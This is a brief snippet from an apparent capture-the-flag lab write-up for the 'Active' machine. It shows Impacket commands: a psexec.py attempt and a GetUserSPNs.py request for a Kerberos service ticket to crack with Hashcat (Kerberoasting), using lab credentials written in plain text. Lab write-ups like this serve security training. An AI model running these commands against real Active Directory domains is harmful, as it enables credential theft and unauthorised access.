**Here we make a request to the domain controller for a service ticket, and crack with Hashcat.**
```bash
psexec.py active.htb/svc_tgs:GPPstillStandingStrong2k18@$TARGET
```
The above does not work (Intentionally)
```bash
wget https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
```
```bash
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip $TARGET -request
```
==Insert service ticket here!==
